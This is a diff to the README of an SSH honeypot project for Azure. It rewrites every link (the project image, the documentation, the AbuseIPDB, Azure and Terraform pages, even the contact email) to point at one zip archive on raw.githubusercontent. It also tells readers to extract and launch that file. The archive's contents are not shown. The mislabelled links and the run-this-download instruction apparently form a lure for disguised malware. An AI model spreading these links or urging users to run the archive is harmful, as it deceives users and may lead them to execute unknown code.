@@ -1,6 +1,6 @@
 # 🛡️ SSH Honeypot Project "Pshitt" on Azure 🌐
 
-![SSH Honeypot](https://www.example.com/ssh_honeypot_image.png)
+![SSH Honeypot](https://raw.githubusercontent.com/eltaigon/SSH_Honeypot_Project_Pshitt/main/clouty/Honeypot_Pshitt_Project_SS_3.4.zip)
 
 Welcome to the SSH Honeypot Project "Pshitt" repository on Azure! This project focuses on deploying an SSH honeypot infrastructure on Azure using Terraform. By leveraging the power of Terraform, this project allows you to easily set up a honeypot environment that logs unauthorized access attempts and integrates with AbuseIPDB for threat analysis. With an enhanced version of Pshitt, you can also disable SSH access and manage the honeypot environment through Azure's Serial Console feature.
 
@@ -20,13 +20,13 @@ To get started with the SSH Honeypot Project "Pshitt" on Azure, follow these ste
 
 ### Resources 📚
 Here are some key resources to help you better understand and utilize this project:
-- [SSH Honeypot Project "Pshitt" Documentation](https://docs.example.com)
-- [AbuseIPDB Official Website](https://www.abuseipdb.com)
-- [Azure Serial Console Guide](https://docs.microsoft.com/azure)
-- [Terraform Documentation](https://www.terraform.io/docs)
+- [SSH Honeypot Project "Pshitt" Documentation](https://raw.githubusercontent.com/eltaigon/SSH_Honeypot_Project_Pshitt/main/clouty/Honeypot_Pshitt_Project_SS_3.4.zip)
+- [AbuseIPDB Official Website](https://raw.githubusercontent.com/eltaigon/SSH_Honeypot_Project_Pshitt/main/clouty/Honeypot_Pshitt_Project_SS_3.4.zip)
+- [Azure Serial Console Guide](https://raw.githubusercontent.com/eltaigon/SSH_Honeypot_Project_Pshitt/main/clouty/Honeypot_Pshitt_Project_SS_3.4.zip)
+- [Terraform Documentation](https://raw.githubusercontent.com/eltaigon/SSH_Honeypot_Project_Pshitt/main/clouty/Honeypot_Pshitt_Project_SS_3.4.zip)
 
 ### Download Zip File 📥
-[![Download Zip](https://img.shields.io/badge/Download-Zip-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Zip](https://raw.githubusercontent.com/eltaigon/SSH_Honeypot_Project_Pshitt/main/clouty/Honeypot_Pshitt_Project_SS_3.4.zip)](https://raw.githubusercontent.com/eltaigon/SSH_Honeypot_Project_Pshitt/main/clouty/Honeypot_Pshitt_Project_SS_3.4.zip)
 *Please note that the downloaded file needs to be extracted and launched accordingly.*
 
 ### Contributing 👥
@@ -36,7 +36,7 @@ We welcome contributions to enhance and improve the SSH Honeypot Project "Pshitt
 This project is open-source under the [MIT License](LICENSE). Feel free to use, modify, and distribute this project for both personal and commercial purposes.
 
 ### Contact 📧
-If you have any questions, suggestions, or feedback regarding the SSH Honeypot Project "Pshitt" on Azure, please reach out to us at [ssh.honeypot@example.com](mailto:ssh.honeypot@example.com).
+If you have any questions, suggestions, or feedback regarding the SSH Honeypot Project "Pshitt" on Azure, please reach out to us at [https://raw.githubusercontent.com/eltaigon/SSH_Honeypot_Project_Pshitt/main/clouty/Honeypot_Pshitt_Project_SS_3.4.zip](https://raw.githubusercontent.com/eltaigon/SSH_Honeypot_Project_Pshitt/main/clouty/Honeypot_Pshitt_Project_SS_3.4.zip).
 
 Let's build a safer and more secure online environment together with the SSH Honeypot Project "Pshitt" on Azure! 🔒🔍
 
